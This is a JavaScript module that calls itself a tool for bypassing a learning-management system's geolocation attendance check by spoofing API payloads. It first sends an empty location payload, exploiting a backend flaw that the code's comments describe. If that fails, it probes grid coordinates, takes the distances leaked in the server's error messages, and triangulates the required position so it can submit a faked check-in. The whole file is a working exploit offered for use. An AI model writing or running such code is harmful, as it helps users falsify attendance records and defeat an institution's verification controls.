'use strict';

const { MultilaterationSolver } = require('../location-math/multilateration');
const { RadialGridSearch } = require('../location-math/grid-search');

/**
 * Executes a Geo Location attendance check via API payload spoofing.
 */
class GeoAuthStrategy {
  constructor(agent, logger) {
    this.agent = agent;
    this.logger = logger;
    this.solver = new MultilaterationSolver({ logger });
  }

  async execute(taskId, payload) {
    // Strategy 1: Empty payload (Exploits LMS backend vulnerability where empty geometry is marked present)
    this.logger.info('Attempting fast-path empty payload strategy...');
    let res = await this._submitCoordinates(taskId, null, null);
    if (res.status === 'SUCCESS') {
      return { status: 'success', message: 'Geo check bypassed via fast-path.' };
    }

    // Strategy 2: Active solving using global multilateration and radar feedback
    this.logger.warn('Fast-path failed. Engaging active geo-solver mode...');
    return await this._activeSolver(taskId);
  }

  async _activeSolver(taskId) {
    // Default fallback anchor (e.g. general campus center if not provided by teacher)
    const anchorLat = 24.178; 
    const anchorLng = 120.604;
    
    const grid = new RadialGridSearch(anchorLat, anchorLng);
    const observations = [];

    // Probe concentric rings outwards
    for (const point of grid.generatePoints(50, 4)) {
      if (observations.length > 15) {
        this.logger.error('Failed to locate target within observation limits.');
        break;
      }

      const probeRes = await this._submitCoordinates(taskId, point.lat, point.lng);
      
      if (probeRes.status === 'SUCCESS') {
        return { status: 'success', message: 'Geo location hit directly during probing.' };
      }

      // If failed, API usually returns the distance to the target in the error message
      // Extract the numeric distance using regex obfuscated match
      if (probeRes.message && probeRes.message.includes('超出')) {
        const match = probeRes.message.match(/(\d+(?:\.\d+)?)/);
        if (match) {
          observations.push({
            lat: point.lat,
            lng: point.lng,
            distanceMeters: parseFloat(match[1])
          });
          this.logger.debug(`Observation logged: distance = ${match[1]}m`);
        }
      }

      // If we have enough points, try to triangulate
      if (observations.length >= 4) {
        const guess = this.solver.solve(observations);
        if (guess) {
          const finalRes = await this._submitCoordinates(taskId, guess.lat, guess.lng);
          if (finalRes.status === 'SUCCESS') {
            return { status: 'success', message: 'Triangulation successful. Geo submitted.' };
          }
          // if triangulation failed, clear observations and keep probing outwards
          observations.length = 0; 
        }
      }
    }

    return { status: 'failed', message: 'Geo solver exhausted without success.' };
  }

  async _submitCoordinates(taskId, lat, lng) {
    const url = this.agent.endpoints.submitGeo(taskId);
    
    const bodyObj = {
      user_info: "WIFI"
    };

    if (lat !== null && lng !== null) {
      bodyObj.gps_point = { lat, lng };
    }

    const res = await this.agent.request(url, {
      method: 'PUT',
      body: JSON.stringify(bodyObj),
      headers: { 'Content-Type': 'application/json' }
    });

    const data = await res.json();

    if (data.status === 1) return { status: 'SUCCESS' };
    return { status: 'FAILED', message: data.message || '' };
  }
}

module.exports = {
  GeoAuthStrategy
};
